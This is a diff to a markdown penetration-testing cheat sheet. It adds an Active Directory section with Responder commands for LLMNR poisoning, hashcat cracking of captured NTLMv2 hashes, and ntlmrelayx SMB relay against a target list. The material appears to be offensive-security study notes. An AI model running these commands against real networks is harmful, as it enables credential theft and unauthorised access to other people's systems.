@@ -136,9 +136,19 @@ xsser –gtk - Launch interface
 ```
 
 ## Active Directory
+### Initial Attack vectors
+### LLMNR Poisoning
+```
+python Responder.py -l tun0 -rdw 
+hashcat -m 5600 hashes.txt rockyou.txt
+```
+### SMB Relay
+```
+gedit Responder.conf
+python Responder.py -l tun0 -rdw 
+python ntlmrelayx.py -tf targets.txt -smb2support (wait for an event)
+```
 
-
-### Enumeration
 ### Exploits
 ### Post Exploitation
 
